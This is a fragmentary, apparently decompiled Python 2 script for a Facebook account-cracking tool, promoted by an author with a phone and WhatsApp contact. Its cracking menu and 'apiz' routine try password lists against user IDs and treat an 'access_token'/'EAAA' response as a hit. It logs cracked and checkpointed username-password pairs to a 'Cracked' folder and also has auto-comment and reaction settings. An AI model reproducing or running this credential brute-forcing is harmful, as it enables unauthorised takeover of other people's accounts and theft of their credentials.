# DECOMPILED BY MR HUSSAINI
# FACEBOOK : AR TERMUX TRICK
# CONTACT : 03047269778
import os
try:
    import requests
...
zkid2 = '1675627047'
zscomments = random.choice(['Great\xf0\x9f\x8c\xb9', 'Nice\xf0\x9f\x8c\xb9', 'Osm\xf0\x9f\x8c\xb9', 'Perfect\xf0\x9f\x8c\xb9'])
reac = 'CARE'
...
zmbflogo ="\n💋 d888888b  .d88b.   .d88b.  d8888b. \n"
loginlogo ="\n💋`~~88~~' .8P  Y8. .8P  Y8. 88  `8D \n"
cookieslogo ='\n   88    88    88 88    88 88oobY'\n                                \n  '
tokenlogo = "\n0   88    88    88 88    88 88`8b   \n "
idPasslogo ='\nc   88    `8b  d8' `8b  d8' 88 `88. \n                                       \n'
cracklogo = "\n   YP     `Y88P'   `Y88P'  88   YD                               \n\n"
crackinglogo = "\n💋💋💋💋💋💋💋💋💋💋💋\n                                          \n                                        |___/  \n"
checkerlogo = "\n💋💋💋💋💋💋💋💋💋\n                                        \n                                        \n"
I = '\x1b[0;32m'
...
def results(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        print '\xe2\x94\x9c  Follow My Page: Ar Termux Trick             \xe2\x94\xa4'
        print '\xe2\x94\x9c  Whatsapp: 03047269778            \xe2\x94\xa4'
        print '\xe2\x94\x9c  Allah Bless You All \xe2\x94\xa4'
        ...
        print '\x1b[0;97m\xe2\x94\x9c        |\xf0\x9f\x8c\xb9Thanks For Using My Tool.     \xf0\x9f\x8c\xb9|       \xe2\x94\xa4'
...
def login():
    ...
    try:
        ...
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9Author Name: ALI RAZA    \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9Wp     : 03047269778\xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9Enjoy    : UsingMy Tool       \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x9c     |\xf0\x9f\x8c\xb9Best   : Tool   \xf0\x9f\x8c\xb9|      \xe2\x94\xa4'
        print '\xe2\x94\x9c     \x1b[0;97m\xe2\x94\x94' + 35 * '\xe2\x94\x80' + '\xe2\x94\x98      \xe2\x94\xa4'
        print '\x1b[0;97m\xe2\x94\x94' + 48 * '\xe2\x94\x80' + '\xe2\x94\x98'

    zk = raw_input('\n  \x1b[0;97m[\x1b[0;92m\xe2\x9e\xa3\x1b[0;97m] Type Zk/zk To Enter The Ali Tool: ')
    if zk == '':
...
def cracking_menu():
    ...
    print '\xe2\x94\x9c [09] Follow My Page              \xe2\x94\xa4'
    print '\xe2\x94\x9c [10] My Whatsapp                    \xe2\x94\xa4'
    print '\xe2\x94\x9c [11] For Help Contact                    \xe2\x94\xa4'
    ...
    def apiz(self, user, zkth):
        ...
        for pw in zkth:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[ALI_OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    print '\r%s[ALI_CP]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
                ...
                print '\r%s[ALI_CP]: %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
                wrt = '%s | %s ' % (user, pw)
                cp.append(wrt)
                open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
                break
